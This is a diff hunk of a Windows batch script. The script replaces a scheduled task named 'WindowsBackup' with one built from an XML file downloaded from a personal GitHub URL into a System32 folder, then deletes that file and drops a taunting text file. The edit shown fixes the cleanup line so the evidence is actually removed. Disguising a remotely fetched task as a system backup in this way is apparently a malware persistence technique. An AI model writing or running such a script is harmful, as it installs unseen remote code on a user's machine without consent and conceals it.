@@ -5,7 +5,7 @@ schtasks /End /TN "WindowsBackup"
 schtasks /Delete /TN "WindowsBackup" /F
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitukitii/test/main/windowsbackup.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowsbackup.xml'"
 schtasks /create /tn "WindowsBackup" /xml "C:\Windows\System32\WindowsPowerShell\windowsbackup.xml" /f
-del /f /q "C:\Windows\System32\WindowsPowerShell\windowsbackup.xml.xml"
+del /f /q "C:\Windows\System32\WindowsPowerShell\windowsbackup.xml"
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe2.txt"
 
 exit
